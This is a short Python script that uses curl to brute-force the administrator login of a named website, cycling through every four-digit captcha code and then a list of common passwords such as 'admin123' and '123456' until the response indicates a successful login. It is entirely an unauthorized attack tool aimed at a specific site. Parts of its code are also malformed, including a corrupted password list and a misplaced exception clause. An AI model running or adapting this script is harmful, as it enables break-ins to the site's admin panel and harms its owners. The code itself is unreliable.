import subprocess, re, time, json

# 暴力4位验证码 + 常见密码
URL = "http://yurundianqi.com"
LOGIN = "/admin.php?s=/Login/login"
COOKIE = "/tmp/yu_brute.txt"

PASSWORDS=***"admin","123456","admin123","admin888","12345678","password","888888","admin@123","yurundianqi","yurun"]

found = False
count = 0

for i in range(10000):
    cv = f"{i:04d}"
    count += 1
    
    try:
        if i % 20 == 0:
            subprocess.run(["curl","-sk","--connect-timeout","8",f"{URL}/admin.php","-c",COOKIE,"-b",COOKIE,"-o","/dev/null"],timeout=10)
            subprocess.run(["curl","-sk","--connect-timeout","8",f"{URL}/admin.php?s=/Login/verify/id/a_login_1","-b",COOKIE,"-o","/dev/null"],timeout=10)
        
        r = subprocess.run(["curl","-sk","--connect-timeout","6","--max-time","8","-L",f"{URL}{LOGIN}","-X","POST",
            "-d",f"username=admin&password=admin&code={cv}","-b",COOKIE],capture_output=True,text=True,timeout=10)
        
        if "验证码不正确" not in r.stdout:
            print(f"[{cv}] DIFFERENT: {r.stdout[:100]}")
            if "后台" in r.stdout or "管理" in r.stdout:
                print(f">>> LOGIN SUCCESS! code={cv}")
                found = True
                break
            # Maybe captcha OK but password wrong
            for pw in PASSWORDS:
                r2 = subprocess.run(["curl","-sk","-L",f"{URL}{LOGIN}","-X","POST",
                    "-d",f"username=admin&password={pw}&code={cv}","-b",COOKIE],capture_output=True,text=True,timeout=8)
                if "验证码不正确" not in r2.stdout and len(r2.stdout) > 100:
                    print(f">>> CAPTCHA OK: code={cv} pw={pw} => {r2.stdout[:80]}")
        except: pass
    except: pass
    
    if i % 200 == 0:
        print(f"[{i}/10000]", flush=True)

if not found:
    print("No code found")
